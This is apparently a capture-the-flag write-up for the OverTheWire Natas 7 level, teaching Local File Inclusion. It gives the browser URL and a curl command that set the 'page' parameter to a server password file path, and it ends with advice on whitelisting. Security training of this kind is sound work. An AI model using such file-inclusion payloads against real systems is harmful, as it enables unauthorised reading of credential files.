# Natas 7 → Natas 8

## Level Information

* URL: `http://natas7.natas.labs.overthewire.org`
* Username: `natas7`
* Password: `[REDACTED]`

## Goal

Find the password for the next level, `natas8`.

## Page Observation

When I opened the page, I saw two links:

```text
Home
About
```

After clicking the links, I noticed that the URL used a `page` parameter.

Example:

```text
http://natas7.natas.labs.overthewire.org/index.php?page=home
```

and:

```text
http://natas7.natas.labs.overthewire.org/index.php?page=about
```

This means the application loads page content based on the value of the `page` parameter.

## Concept

This level introduces Local File Inclusion, also known as LFI.

Local File Inclusion happens when a web application loads a file based on user input without proper validation. If the application allows the user to control the file path, an attacker may be able to read sensitive local files from the server.

In this level, the `page` parameter can be changed to load another file.

## Source Code Hint

I viewed the page source using:

```text
Ctrl + U
```

Inside the HTML source, there was a hint showing the location of the password file:

```text
/etc/natas_webpass/natas8
```

This file contains the password for the next level.

## Steps

1. Opened the Natas 7 page.
2. Clicked the `Home` and `About` links.
3. Observed that the website used a `page` parameter in the URL.
4. Viewed the page source using `Ctrl + U`.
5. Found the hint showing the password file path.
6. Modified the `page` parameter to read the password file.
7. Opened the following URL:

```text
http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
```

8. The page displayed the password for `natas8`.

## Browser Method

Open this URL:

```text
http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
```

## Terminal Method

```bash
curl -u natas7:[REDACTED] \
"http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8"
```

## Result

After changing the `page` parameter to the password file path, the server displayed the password for `natas8`.

## Lesson Learned

User-controlled file paths are dangerous. A web application should never directly include or read files based on unsanitized user input.

To prevent Local File Inclusion, developers should validate allowed pages using a whitelist and avoid passing raw user input into file include functions.

## Password

```text
[REDACTED]
```
